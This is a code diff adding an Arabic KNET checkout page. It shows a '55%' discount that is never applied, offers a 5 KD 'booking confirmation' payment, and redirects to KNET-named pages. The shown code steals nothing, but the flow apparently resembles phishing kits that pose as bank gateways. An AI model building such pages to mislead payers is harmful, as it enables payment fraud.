@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>الدفع</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Tahoma', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f5f5f5;
+      direction: rtl;
+      color: #000;
+    }
+
+    .card {
+      background-color: #fff;
+      margin: 12px;
+      padding: 16px;
+      border-radius: 14px;
+      box-shadow: 0 1px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .section-title {
+      font-weight: bold;
+      font-size: 1.1em;
+      margin-bottom: 12px;
+    }
+
+    .payment-method {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .payment-method img {
+      width: 50px;
+    }
+
+    .section-number {
+      display: inline-block;
+      width: 26px;
+      height: 26px;
+      border-radius: 50%;
+      background-color: black;
+      color: white;
+      font-size: 0.9em;
+      text-align: center;
+      line-height: 26px;
+      margin-left: 6px;
+    }
+
+    .summary-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 6px 0;
+      font-size: 0.95em;
+    }
+
+    .summary-row.discount {
+      color: green;
+    }
+
+    .summary-row.fees {
+      color: red;
+    }
+
+    .summary-row.total {
+      font-weight: bold;
+      font-size: 1.1em;
+      color: red;
+    }
+
+    .button-group {
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin: 20px 12px 40px;
+    }
+
+    .pay-button {
+      background-color: #d70000;
+      color: white;
+      font-size: 1em;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+
+    .pay-button:hover {
+      background-color: #b00000;
+    }
+
+    @media (max-width: 480px) {
+      .card {
+        margin: 10px 8px;
+        padding: 14px;
+      }
+
+      .pay-button {
+        font-size: 1em;
+      }
+
+      .summary-row {
+        font-size: 0.95em;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- طريقة الدفع -->
+  <div class="card">
+    <div class="section-title">طريقة الدفع</div>
+    <div class="payment-method">
+      <img src="images (3).png" alt="KNET Logo">
+      <span>كي نت</span>
+    </div>
+  </div>
+
+  <!-- تفاصيل الدفع -->
+  <div class="card">
+    <div class="section-title">
+      <span class=""></span>انقطاع الدفع
+    </div>
+
+    <div class="summary-row">
+      <span>مبلغ إجمالي</span>
+      <span id="originalAmount">--</span>
+    </div>
+    <div class="summary-row discount">
+      <span>تخفيض</span>
+      <span>55%</span>
+    </div>
+    <div class="summary-row fees">
+      <span>رسوم التوصيل</span>
+      <span>0.000 د.ك</span>
+    </div>
+    <div class="summary-row total">
+      <span>المبلغ الإجمالي</span>
+      <span id="total">--</span>
+    </div>
+  </div>
+
+  <!-- أزرار الدفع -->
+  <div class="button-group">
+    <button class="pay-button" id="fullPay">دفع المبلغ الكامل</button>
+    <button class="pay-button" id="partPay">دفع 5 د.ك لتأكيد الحجز</button>
+  </div>
+
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const storedAmount = localStorage.getItem("boton") || "0.000";
+      document.getElementById("originalAmount").textContent = storedAmount + " د.ك";
+      document.getElementById("total").textContent = storedAmount + " د.ك";
+
+      document.getElementById("fullPay").addEventListener("click", function () {
+        localStorage.setItem("boton", storedAmount);
+        window.location.href = "kpaytotal.html";
+      });
+
+      document.getElementById("partPay").addEventListener("click", function () {
+        localStorage.setItem("boton", "5.000");
+        window.location.href = "kpaykuwait.html";
+      });
+
+      renderCart();
+    });
+
+    function renderCart() {
+      console.log("محتوى السلة جاهز");
+    }
+  </script>
+</body>
+</html>
